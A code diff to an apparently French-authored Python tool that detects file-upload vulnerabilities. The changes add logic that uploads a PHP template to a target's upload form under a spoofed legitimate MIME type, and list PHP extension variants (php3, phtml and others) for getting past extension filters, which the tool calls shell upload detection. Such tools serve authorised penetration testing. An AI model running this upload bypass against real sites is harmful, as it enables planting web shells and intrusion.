@@ -76,11 +76,14 @@ if args.legitExtensions :
 			args.legitExtensions.remove(b)
 else :
 	extensions = loadExtensions("file",mimeFile)
+toutesLesExtensions = [x[0] for x in extensions]
+
 nastyExtensions = ["php","asp"]
 
 postData = postDataFromStringToJSON(args.data)
 
 s = requests.Session()
+##### PROXY HANDLING #####
 s.trust_env = False
 if args.proxy :
 	if args.proxy["username"] and args.proxy["password"] and args.proxyCreds :
@@ -122,7 +125,9 @@ try :
 except Exception as e :
 		logging.critical("%s : Host unreachable (%s)",getHost(args.url),e)
 		exit()
+#########################################################
 
+##### FILE UPLOAD FORM DETECTION #####
 detectedForms = detectForms(initGet.text)
 
 if len(detectedForms) == 0 :
@@ -144,7 +149,7 @@ try :
 	uploadURL = schema+"://"+host+"/"+action
 except :
 	uploadURL = initGet.url
-
+############################################################
 
 
 
@@ -194,18 +199,23 @@ if validExtensions == [] :
 	logging.error("No valid extension found.")
 	exit()
 #################################################################
-logging.info("### Starting messing with file extensions and mime types...")
+
+logging.info("### Starting shell upload detection (messing with file extensions and mime types...)")
 succeededAttempts = []
-toutesLesExtensions = [x[0] for x in extensions]
 
 nastyExt = "php"
+nastyMime = getMime(extensions,nastyExt)
+template = open("template.php","rb")
 nastyExtVariants = ["php1","php2","php3","php4","php5","phtml"]
-template = open("template.php","r")
-legitExt = validExtensions[0][0]
-legitMime = validExtensions[0][1]
-#tenter juste en envoyant un faux type mime
-#res = fileUploadTest(uploadUrl,postdata,sufix,weight,mimetype,args.notRegex,args.trueRegex,fileinputField)
 
+legitExt = validExtensions[0]
+legitMime = getMime(extensions,legitExt)
+#trying to upload template by changing mime type only
+res = fileUploadTest(uploadURL,s,postData,"."+nastyExt,args.size,legitMime,args.notRegex,args.trueRegex,fileInput["name"],template.read())
+if res["success"] :
+	logging.info("\033[1m\033[42mFile '%s' uploaded with success using a mime type of '%s'.\033[m",res["filename"],legitMime)
+
+exit()
 
 ############################################################################################################
 #still looking for a more pythonic way to do this ...
